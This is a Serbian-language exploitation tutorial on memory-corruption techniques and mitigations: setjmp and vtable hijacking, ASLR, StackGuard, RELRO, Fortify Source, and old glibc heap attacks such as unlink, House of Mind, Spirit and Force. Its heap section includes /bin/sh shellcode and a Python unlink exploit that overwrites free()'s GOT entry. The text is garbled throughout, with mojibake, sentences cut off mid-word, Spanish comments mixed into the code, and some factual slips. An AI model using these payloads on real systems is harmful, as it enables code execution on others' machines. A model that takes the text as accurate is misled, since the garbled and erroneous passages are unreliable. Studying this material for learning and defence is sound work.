{% hint style="danger" %}
Danas je vrlo **neobiÄno iskoristiti ovo**.
{% endhint %}

**`Setjmp()`** omoguÄ‡ava da se **saÄuva** **kontekst** (registri)\
**`longjmp()`** omoguÄ‡ava da se **obnovi** **kontekst**.\
**SaÄuvani registri** su: `EBX, ESI, EDI, ESP, EIP, EBP`\
Ono Å¡to se deÅ¡ava je da se EIP i ESP prosleÄ‘uju kroz funkciju **`PTR_MANGLE`**, tako da su **arhitekture koje su podloÅ¾ne ovom napadu iste kao i prethodno navedene**.\
Koriste se za oporavak od greÅ¡aka ili prekida.\
MeÄ‘utim, prema onome Å¡to sam proÄitao, ostali registri nisu zaÅ¡tiÄ‡eni, **pa ako postoji `call ebx`, `call esi` ili `call edi`** unutar funkcije koja se poziva, moÅ¾e se preuzeti kontrola. Ili takoÄ‘e moÅ¾ete izmeniti EBP da biste izmenili ESP.

**VTable i VPTR u C++**

Svaka klasa ima **Vtable** koji je niz **pokazivaÄa na metode**.

Svaki objekat klase ima **VPtr** koji je **pokazivaÄ** na niz svoje klase. VPtr je deo zaglavlja svakog objekta, pa ako se postigne **prepisivanje** VPtr-a, moÅ¾e se **izmeniti** da **pokazuje** na laÅ¾nu metodu, tako da izvrÅ¡avanje funkcije ide na shell kod.

## **Preventivne mere i izbegavanje**

**ASLR nije tako sluÄajan**

PaX deli prostor adresa procesa u 3 grupe:

Kod i inicijalizovani i neinicijalizovani podaci: .text, .data i .bss â€”> 16 bita entropije u promenljivoj delta\_exec, ova promenljiva se inicijalizuje nasumiÄno sa svakim procesom i dodaje se na poÄetne adrese

Memorija dodeljena pomoÄ‡u mmap() i deljenih biblioteka â€”> 16 bita, delta\_mmap

Stek â€”> 24 bita, delta\_stack â€”> Zaista 11 (od 10. do 20. bajta ukljuÄujuÄ‡i) â€”> poravnato na 16 bajta â€”> 524.288 moguÄ‡ih stvarnih adresa steka

OkruÅ¾enjske promenljive i argumenti se pomeraju manje od bafera na steku.

**Return-into-printf**

To je tehnika koja pretvara preplavljivanje bafera u greÅ¡ku formatiranja stringa. Sastoji se od zamene EIP-a tako da pokazuje na printf funkciju i prosleÄ‘ivanja manipulisanog formatiranog stringa kao argumenta kako bi se dobile vrednosti o stanju procesa.

**Napad na biblioteke**

Biblioteke se nalaze na poziciji sa 16 bita nasumiÄnosti = 65636 moguÄ‡ih adresa. Ako ranjiv server pozove fork(), prostor adresa memorije se kopira u proces dete i ostaje netaknut. Zato se moÅ¾e pokuÅ¡ati izvrÅ¡iti brute force napad na usleep() funkciju iz libc, prosleÄ‘ujuÄ‡i joj argument "16", tako da kada duÅ¾e vreme traje da odgovori, ta funkcija je pronaÄ‘ena. ZnajuÄ‡i gde se ta funkcija nalazi, moÅ¾e se dobiti delta\_mmap i izraÄunati ostale vrednosti.

Jedini naÄin da budemo sigurni da ASLR funkcioniÅ¡e je koriÅ¡Ä‡enje 64-bitne arhitekture. Tamo nema brute force napada.

**StackGuard i StackShield**

**StackGuard** ubacuje pre EIP-a â€”> 0x000aff0d(null, \n, EndOfFile(EOF), \r) â€”> I dalje su ranjive recv(), memcpy(), read(), bcoy() i ne Å¡titi EBP

**StackShield** je sloÅ¾eniji od StackGuard-a

Sve povratne adrese EIP se Äuvaju u tabeli (Global Return Stack) tako da preplavljivanje bafera ne prouzrokuje nikakvu Å¡tetu. TakoÄ‘e, obe adrese se mogu uporediti da se vidi da li je doÅ¡lo do preplavljivanja.

TakoÄ‘e se moÅ¾e proveriti povratna adresa sa graniÄnom vrednoÅ¡Ä‡u, pa ako EIP ode na drugo mesto, kao Å¡to je prostor podataka, znaÄ‡e se. Ali to se moÅ¾e zaobiÄ‡i sa Ret-to-lib, ROP ili ret2ret.

Kao Å¡to se moÅ¾e videti, stackshield takoÄ‘e ne Å¡titi lokalne promenljive.

**Stack Smash Protector (ProPolice) -fstack-protector**

Canary se stavlja pre EBP-a. Lokalne promenljive se reorganizuju tako da baferi budu na najviÅ¡im pozicijama i tako ne mogu prebrisati druge promenljive.

TakoÄ‘e, vrÅ¡i se sigurna kopija prosleÄ‘enih argumenata iznad steka (iznad lokalnih promenljivih) i koristi se ova kopija kao argumenti.

Ne moÅ¾e zaÅ¡tititi nizove sa manje od 8 elemenata ili baufere koji su deo korisniÄke strukture.

Canary je sluÄajan broj izvuÄen iz "/dev/urandom" ili ako nije, onda je 0xff0a0000. ÄŒuva se u TLS (Thread Local Storage). Niti dele isti prostor memorije, TLS je oblast koja ima globalne ili statiÄke promenljive za svaku nit. MeÄ‘utim, u principu se kopiraju iz roditeljskog procesa, iako bi proces dete mogao da izmeni ove
### Relro

**Relro (Read only Relocation)** utiÄe na dozvole memorije sliÄno kao NX. Razlika je u tome Å¡to dok NX Äini stek izvrÅ¡ivim, RELRO Äini **odreÄ‘ene stvari samo za Äitanje**, tako da im ne moÅ¾emo pisati. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo predstavlja prepreku je spreÄavanje **prepisivanja `got` tabele**, o Äemu Ä‡e biti reÄeno kasnije. `Got` tabela sadrÅ¾i adrese libc funkcija tako da binarni zna koje su adrese i moÅ¾e ih pozvati. Hajde da vidimo kako izgledaju dozvole memorije za unos u `got` tabelu za binarnu datoteku sa i bez relro.

Sa relro:
```bash
gefâ¤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gefâ¤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gefâ¤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  â†’   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Bez relro:
```bash
gefâ¤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gefâ¤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gefâ¤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  â†’   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Za binarni fajl **bez relro**-a, moÅ¾emo videti da je adresa `got` unosa za `fgets` `0x404018`. PogledajuÄ‡i mapiranje memorije, vidimo da se nalazi izmeÄ‘u `0x404000` i `0x405000`, Å¡to ima **dozvole `rw`**, Å¡to znaÄi da moÅ¾emo Äitati i pisati u toj oblasti. Za binarni fajl **sa relro**-om, vidimo da je adresa tabele `got` za pokretanje binarnog fajla (pie je omoguÄ‡en, pa Ä‡e se ova adresa promeniti) `0x555555557fd0`. U mapiranju memorije tog binarnog fajla se nalazi izmeÄ‘u `0x0000555555557000` i `0x0000555555558000`, Å¡to ima memoriju **dozvole `r`**, Å¡to znaÄi da moÅ¾emo samo Äitati iz nje.

Kako onda **zaobiÄ‡i** ovo? TipiÄan naÄin zaobilaÅ¾enja koji koristim je da jednostavno ne piÅ¡em u memorijske regione koje relro Äini samo za Äitanje, i **pronaÄ‘em drugi naÄin za izvrÅ¡avanje koda**.

Napomena da bi ovo moglo da se desi, binarni fajl mora da zna unapred adrese funkcija:

* Lenje povezivanje: Adresa funkcije se traÅ¾i prvi put kada se funkcija pozove. Dakle, `got` mora imati dozvole za pisanje tokom izvrÅ¡avanja.
* PoveÅ¾i odmah: Adrese funkcija se reÅ¡avaju na poÄetku izvrÅ¡avanja, a zatim se dodeljuju dozvole samo za Äitanje osetljivim sekcijama kao Å¡to su .got, .dtors, .ctors, .dynamic, .jcr. `` `** ``-z relro`**`y`**`-z now\`\*\*

Da biste proverili da li program koristi PoveÅ¾i odmah, moÅ¾ete uraditi:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Kada put kada se binarni fajl uÄita u memoriju i funkcija se prvi put pozove, skoÄi se na PLT (Procedure Linkage Table). Odatle se vrÅ¡i skok (jmp) na GOT i otkriva se da ta unosa nije reÅ¡ena (sadrÅ¾i sledeÄ‡u adresu iz PLT). Zatim se poziva Runtime Linker ili rtfd da reÅ¡i adresu i saÄuva je u GOT.

Kada se pozove funkcija, poziva se PLT, koja ima adresu GOT gde se Äuva adresa funkcije, tako da preusmerava tok izvrÅ¡avanja tamo i poziva funkciju. MeÄ‘utim, ako je prvi put da se poziva funkcija, ono Å¡to se nalazi u GOT je sledeÄ‡a instrukcija iz PLT, pa tok izvrÅ¡avanja prati kod PLT (rtfd) i saznaje adresu funkcije, Äuva je u GOT i poziva.

Prilikom uÄitavanja binarnog fajla u memoriju, kompajler mu je rekao na kojem offsetu treba da se nalaze podaci koji se moraju uÄitati prilikom pokretanja programa.

Lenje vezivanje (Lazy binding) - Adresa funkcije se traÅ¾i prvi put kada se ta funkcija pozove, tako da GOT ima dozvolu za pisanje kako bi se adresa saÄuvala tamo i ne bi je trebalo ponovo traÅ¾iti.

VeÅ¾i odmah (Bind now) - Adrese funkcija se traÅ¾e prilikom uÄitavanja programa i menja se dozvola sekcija .got, .dtors, .ctors, .dynamic, .jcr na samo Äitanje. **-z relro** i **-z now**

MeÄ‘utim, opÄ‡enito gledano, programi nisu komplicirani s tim opcijama, pa su ovi napadi i dalje moguÄ‡i.

**readelf -l /proc/ID_PROC/exe | grep BIND_NOW** - Da biste saznali da li koriste BIND NOW

**Fortify Source -D_FORTIFY_SOURCE=1 ili =2**

PokuÅ¡ava identifikovati funkcije koje nebezbedno kopiraju podatke sa jednog mesta na drugo i menja funkciju sa bezbednom funkcijom.

Na primer:\
char buf[16];\
strcpy(buf, source);

Identifikuje je kao nebezbednu i zatim menja strcpy() sa \_\_strcpy\_chk() koristeÄ‡i veliÄinu bafera kao maksimalnu veliÄinu za kopiranje.

Razlika izmeÄ‘u **=1** i **=2** je da:

Druga ne dozvoljava da **%n** dolazi iz sekcije sa dozvolom za pisanje. TakoÄ‘e, parametar za direktan pristup argumentima moÅ¾e se koristiti samo ako su prethodno koriÅ¡Ä‡eni, tj. moÅ¾e se koristiti samo **%3$d** ako je prethodno koriÅ¡Ä‡eno **%2$d** i **%1$d**

Za prikazivanje poruke o greÅ¡ci koristi se argv\[0\], pa ako se u njega stavi adresa druge lokacije (kao globalna promenljiva), poruka o greÅ¡ci Ä‡e prikazati sadrÅ¾aj te promenljive. Str. 191

**Zamena Libsafe**

Aktivira se sa: LD\_PRELOAD=/lib/libsafe.so.2\
ili\
â€œ/lib/libsave.so.2â€ > /etc/ld.so.preload

Pozivi nekih nebezbednih funkcija se presreÄ‡u i zamenjuju bezbednim funkcijama. Nije standardizovano. (samo za x86, ne za kompilacije sa -fomit-frame-pointer, ne za statiÄke kompilacije, ne sve ranjive funkcije postaju bezbedne i LD\_PRELOAD ne radi za binarne fajlove sa suid).

**ASCII Armored Address Space**

Sastoji se od uÄitavanja deljenih biblioteka od 0x00000000 do 0x00ffffff kako bi uvek postojao bajt 0x00. MeÄ‘utim, ovo zapravo ne zaustavlja gotovo nijedan napad, a posebno ne u little endian formatu.

**ret2plt**

Sastoji se od izvoÄ‘enja ROP-a tako da se pozove funkcija strcpy@plt (iz plt-a) i usmeri se na unos u GOT-u i kopira se prvi bajt funkcije koju Å¾elimo pozvati (system()). Zatim se isto radi usmeravajuÄ‡i se na GOT+1 i kopira se drugi bajt system()... Na kraju se poziva adresa koja je saÄuvana u GOT-u, a to Ä‡e biti system().

**LaÅ¾ni EBP**

Za funkcije koje koriste EBP kao registar za pokazivaÄ na argumente, prilikom izmene EIP-a i usmeravanja na system(), takoÄ‘e treba izmeniti i EBP kako bi pokazivao na memorijsko podruÄje koje ima bilo koja 2 bajta, a zatim na adresu &"/bin/sh".

**Kavezi sa chroot()**

debootstrap -arch=i386 hardy /home/user - Instalira osnovni sistem u odreÄ‘eni poddirektorijum

Administrator moÅ¾e izaÄ‡i iz ovih kaveza tako Å¡to napravi: mkdir foo; chroot foo; cd ..

**Instrumentacija koda**

Valgrind - TraÅ¾i greÅ¡ke\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflow: Osnovni eksploiti**

**Dodeljeni deo**

prev\_size |\
size | - Zaglavlje\
\*mem | Podaci

**Slobodan deo**

prev\_size |\
size |\
\*fd | Ptr naprednog bloka\
\*bk | Ptr nazadnog bloka - Zaglavlje\
\*mem | Podaci

Slobodni delovi su u dvostruko povezanoj listi (bin) i nikada ne smeju postojati dva slobodna dela zajedno (spajaju se).

U "size" se nalaze bitovi koji oznaÄavaju: da li je prethodni deo u upotrebi, da li je deo dodeljen putem mmap() i da li deo pripada primarnoj areni.

Ako se oslobodi deo i neki od susednih delova je slobodan, oni se spajaju pomoÄ‡u makroa unlink() i novi, veÄ‡i deo se prosleÄ‘uje frontlink() da ga ubaci u odgovarajuÄ‡i bin.

unlink(){\
BK = P->bk; - BK novog bloka je onaj koji je imao prethodno slobodan blok\
FD = P->fd; - FD novog bloka je onaj koji je imao prethodno slobodan blok\
FD->bk = BK; - BK sledeÄ‡eg bloka pokazuje na novi blok\
BK->fd = FD; - FD prethodnog bloka pokazuje na novi blok\
}

Dakle, ako uspemo da izmenimo P->bk sa adresom shell koda i P->fd sa adresom unosa u GOT ili DTORS minus 12, postiÅ¾e se:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

I tako se prilikom izlaska iz programa izvrÅ¡ava shell kod.

Osim toga, Äetvrta naredba unlink() piÅ¡e neÅ¡to i shell kod mora biti prilagoÄ‘en za to:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) - Ovo dovodi do pisanja 4 bajta poÄevÅ¡i od 8. bajta shell koda, pa prva instrukcija shell koda mora bit
**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<Iâ€, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo estÃ¡ libre estÃ© a 1**

**fake\_size = pack("\<Iâ€, 0xfffffffc) #-4, para que piense que el â€œsizeâ€ del 3Âº trozo estÃ¡ 4bytes detrÃ¡s (apunta a prev\_size) pues es ahÃ­ donde mira si el 2Âº trozo estÃ¡ libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno**

**got\_free = pack("\<I", 0x08048300 - 12) #DirecciÃ³n de free() en la plt-12 (serÃ¡ la direcciÃ³n que se sobrescrita para que se lanza la shellcode la 2Âº vez que se llame a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque sÃ­**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Se modifica el 2Âº trozo, el got\_free apunta a donde vamos a guardar la direccion addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando en sentido inverso (wargame)**

KontroliÅ¡emo 3 uzastopna chunk-a i oni se oslobaÄ‘aju u obrnutom redosledu od rezervisanog.

U ovom sluÄaju:

U chunk-u c se smeÅ¡ta shellcode

Chunk a koristimo da prepiÅ¡emo b tako da size ima iskljuÄen bit PREV_INUSE tako da misli da je chunk a slobodan.

TakoÄ‘e, u zaglavlju b se prepiÅ¡e size tako da bude -4.

Zatim, program Ä‡e misliti da je "a" slobodan i u binu, pa Ä‡e pozvati unlink() da ga odveÅ¾e. MeÄ‘utim, poÅ¡to PREV_SIZE u zaglavlju ima vrednost -4, pomisliÄ‡e da chunk "a" zapravo poÄinje na b+4. Drugim reÄima, pozvaÄ‡e unlink() na chunk koji poÄinje na b+4, pa Ä‡e u b+12 biti pokazivaÄ "fd", a u b+16 Ä‡e biti pokazivaÄ "bk".

Na ovaj naÄin, ako u bk stavimo adresu shellcode, a u fd stavimo adresu funkcije "puts()"-12, imamo naÅ¡ payload.

**Tehnika Frontlink**

Frontlink se poziva kada se neÅ¡to oslobaÄ‘a, a nijedan od susednih chunk-ova nije slobodan. Tada se ne poziva unlink(), veÄ‡ se direktno poziva frontlink().

Korisna ranjivost kada malloc koji se napada nikada nije osloboÄ‘en (free()).

Potrebno je:

Bafer koji moÅ¾e biti preplavljen unosom podataka

Susedni bafer koji treba osloboditi i Äije Ä‡e se polje fd u zaglavlju izmeniti zbog preplavljivanja prethodnog bafera

Bafer koji treba osloboditi sa veliÄinom veÄ‡om od 512, ali manjom od prethodnog bafera

Bafer koji je deklarisan pre koraka 3 i koji omoguÄ‡ava prepisivanje prev_size-a

Na ovaj naÄin, preplavljujuÄ‡i dva malloc-a na nekontrolisan naÄin i jedan na kontrolisan naÄin koji se samo oslobaÄ‘a, moÅ¾emo izvrÅ¡iti exploit.

**Ranjivost double free()**

Ako se dva puta pozove free() sa istim pokazivaÄem, imaÄ‡emo dva bin-a koji pokazuju na istu adresu.

Ako Å¾elimo ponovo koristiti jedan, to Ä‡e se desiti bez problema. Ako Å¾elimo koristiti drugi, dodeliÄ‡e mu se isti prostor, pa Ä‡emo imati laÅ¾irane pokazivaÄe "fd" i "bk" sa podacima koje Ä‡e upisati prethodna rezervacija.

**After free()**

Prethodno osloboÄ‘eni pokazivaÄ se ponovo koristi bez kontrole.

## **8 Heap preplavljivanje: Napredni exploit-i**

Tehnike Unlink() i FrontLink() su uklonjene izmenom funkcije unlink().

**The house of mind**

Potrebno je samo jedno osloboÄ‘enje (free()) da bi se izvrÅ¡io proizvoljni kod. Potrebno je pronaÄ‡i drugi chunk koji moÅ¾e biti preplavljen prethodnim i osloboÄ‘en.

Poziv free() dovodi do poziva public\_fREe(mem), koji radi sledeÄ‡e:

mstate ar\_ptr;

mchunkptr p;

â€¦

p = mem2chunk(mes); â€”> VraÄ‡a pokazivaÄ na adresu na kojoj chunk poÄinje (mem-8)

â€¦

ar\_ptr = arena\_for\_chunk(p); â€”> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

â€¦

\_int\_free(ar\_ptr, mem);

}

U \[1] se proverava polje size bit NON\_MAIN\_ARENA, koje se moÅ¾e promeniti da bi provera vratila true i izvrÅ¡ila se funkcija heap\_for\_ptr(), koja vrÅ¡i AND operaciju nad "mem" i postavlja na 0 najmanje znaÄajna 2.5 bajta (u naÅ¡em sluÄaju od 0x0804a000 postaje 0x08000000) i pristupa 0x08000000->ar\_ptr (kao da je struktura heap\_info)

Na ovaj naÄin, ako moÅ¾emo kontrolisati chunk na primer na 0x0804a000 i treba osloboditi chunk na **0x081002a0**, moÅ¾emo doÄ‡i do adrese 0x08100000 i upisati Å¡ta god Å¾elimo, na primer **0x0804a000**. Kada se ovaj drugi chunk oslobodi, naÄ‡i Ä‡e da heap\_for\_ptr(ptr)->ar\_ptr vraÄ‡a ono Å¡to smo upisali na 0x08100000 (jer se primenjuje AND na 0x081002a0, Å¡to smo videli ranije, i iz te vrednosti se uzima vrednost prvih 4 bajta, ar\_ptr)

Na ovaj naÄin se poziva \_int\_free(ar\_ptr, mem), odnosno **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
â€¦\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Kao Å¡to smo videli ranije, moÅ¾emo kontrolisati vrednost av, jer je to ono Å¡to piÅ¡emo u chunk koji Ä‡e biti osloboÄ‘en.

Kako je unsorted\_chunks definisan, znamo da:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Dakle, ako u av->bins\[2] upiÅ¡emo vrednost \_\_DTOR\_END\_\_-12, u poslednjoj instrukciji Ä‡e se upisati u \_\_DTOR\_END\_\_ adresa drugog chunk-a.

Drugim reÄima, u prvom chunk-u moramo na poÄetak staviti adres
Ova tehnika viÅ¡e nije primenjiva jer je gotovo isti zakrpa primenjen kao i za unlink. UporeÄ‘uju se da li nova lokacija na koju se pokazuje takoÄ‘e pokazuje na njega.

**Fastbin**

To je varijanta The house of mind

interesuje nas da izvrÅ¡imo sledeÄ‡i kod koji se izvrÅ¡ava nakon prvog provere funkcije \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] â€”> Gde je fastbin\_index(sz) â€”> (sz >> 3) - 2

â€¦

p->fd = \*fb

\*fb = p

Na ovaj naÄin, ako se postavi u "fb", daje adresu funkcije u GOT, na ovu adresu Ä‡e se postaviti adresa prebrisane sekcije. Za ovo Ä‡e biti potrebno da arena bude blizu adresa dtors. TaÄnije, av->max\_fast treba da bude na adresi koju Å¾elimo da prepiÅ¡emo.

S obzirom da smo sa The House of Mind videli da mi kontroliÅ¡emo poziciju av.

Zato, ako u polje size stavimo veliÄinu od 8 + NON\_MAIN\_ARENA + PREV\_INUSE â€”> fastbin\_index() Ä‡e nam vratiti fastbins\[-1\], koji Ä‡e pokazivati na av->max\_fast

U ovom sluÄaju, av->max\_fast Ä‡e biti adresa koja Ä‡e biti prebrisana (ne na koju pokazuje, veÄ‡ ta pozicija Ä‡e biti prebrisana).

TakoÄ‘e, mora se ispuniti uslov da susedni segment osloboÄ‘enog segmenta bude veÄ‡i od 8 -> PoÅ¡to smo rekli da je veliÄina osloboÄ‘enog segmenta 8, u ovom laÅ¾nom segmentu samo trebamo staviti veliÄinu veÄ‡u od 8 (poÅ¡to Ä‡e shellcode biti u osloboÄ‘enom segmentu, treba staviti na poÄetak jmp koji Ä‡e pasti na nops).

TakoÄ‘e, isti laÅ¾ni segment mora biti manji od av->system\_mem. av->system\_mem se nalazi 1848 bajtova dalje.

Zbog nula iz \_DTOR\_END\_ i malog broja adresa u GOT, nijedna adresa iz ovih sekcija ne moÅ¾e biti prebrisana, pa hajde da vidimo kako primeniti fastbin za napad na stek.

JoÅ¡ jedan naÄin napada je preusmeravanje **av** na stek.

Ako promenimo veliÄinu na 16 umesto 8, tada: fastbin\_index() Ä‡e nam vratiti fastbins\[0\] i to moÅ¾emo iskoristiti da prepiÅ¡emo stek.

Za ovo ne sme biti nikakvih canary vrednosti ili Äudnih vrednosti na steku, zapravo moramo biti u ovom rasporedu: 4 nula bajta + EBP + RET

Potrebna su nam 4 nula bajta kako bi **av** bio na toj adresi i prvi element **av** je mutex koji mora biti 0.

**av->max\_fast** Ä‡e biti EBP i biÄ‡e vrednost koja Ä‡e nam omoguÄ‡iti da zaobiÄ‘emo ograniÄenja.

U **av->fastbins\[0\]** Ä‡e biti prebrisana adresa **p** i biÄ‡e RET, tako da Ä‡e se preskoÄiti na shellcode.

TakoÄ‘e, u **av->system\_mem** (1484 bajta iznad pozicije na steku) Ä‡e biti dovoljno smeÄ‡a koje Ä‡e nam omoguÄ‡iti da zaobiÄ‘emo proveru koja se vrÅ¡i.

TakoÄ‘e, mora se ispuniti uslov da susedni segment osloboÄ‘enog segmenta bude veÄ‡i od 8 -> PoÅ¡to smo rekli da je veliÄina osloboÄ‘enog segmenta 16, u ovom laÅ¾nom segmentu samo trebamo staviti veliÄinu veÄ‡u od 8 (poÅ¡to Ä‡e shellcode biti u osloboÄ‘enom segmentu, treba staviti na poÄetak jmp koji Ä‡e pasti na nops koji dolaze nakon polja size novog laÅ¾nog segmenta).

**The House of Spirit**

U ovom sluÄaju traÅ¾imo da imamo pokazivaÄ na malloc koji moÅ¾e biti promenjen od strane napadaÄa (na primer, da je pokazivaÄ na steku ispod moguÄ‡eg prelivanja promenljive).

Na taj naÄin, mogli bismo da navedemo da ovaj pokazivaÄ pokazuje gde god Å¾elimo. MeÄ‘utim, ne svako mesto je validno, veliÄina laÅ¾nog segmenta mora biti manja od av->max\_fast i taÄnije jednaka veliÄini koja Ä‡e biti traÅ¾ena u buduÄ‡em pozivu malloc()+8. Zato, ako znamo da se nakon ovog ranjivog pokazivaÄa poziva malloc(40), veliÄina laÅ¾nog segmenta mora biti jednaka 48.

Na primer, ako program pita korisnika za broj, moÅ¾emo uneti 48 i uputiti promenljivi pokazivaÄ malloc na sledeÄ‡ih 4 bajta (koji mogu pripadati EBP-u sa sreÄ‡om, tako da 48 ostaje iza, kao da je veliÄina zaglavlja). TakoÄ‘e, adresa ptr-4+48 mora zadovoljiti nekoliko uslova (u ovom sluÄaju ptr=EBP), to jest, 8 < ptr-4+48 < av->system\_mem.

Ako se ovo ispuni, kada se pozove sledeÄ‡i malloc koji smo rekli da je malloc(40), dodeliÄ‡e mu se adresa adresa EBP-a. Ako napadaÄ takoÄ‘e moÅ¾e kontrolisati Å¡ta se piÅ¡e u ovom mallocu, moÅ¾e prebrisati i EBP i EIP sa Å¾eljenom adresom.

Mislim da je to zato Å¡to Ä‡e kada se oslobodi free() zabeleÅ¾iti da u adresi koja pokazuje na EBP steka postoji segment savrÅ¡ene veliÄine za novi malloc() koji se Å¾eli rezervisati, pa mu dodeljuje tu adresu.

**The House of Force**

Potrebno je:

* Preplavljivanje segmenta koje omoguÄ‡ava prebrisavanje wildernessa
* Poziv malloc() sa veliÄinom definisanom od strane korisnika
* Poziv malloc() Äiji podaci mogu biti definisani od strane korisnika

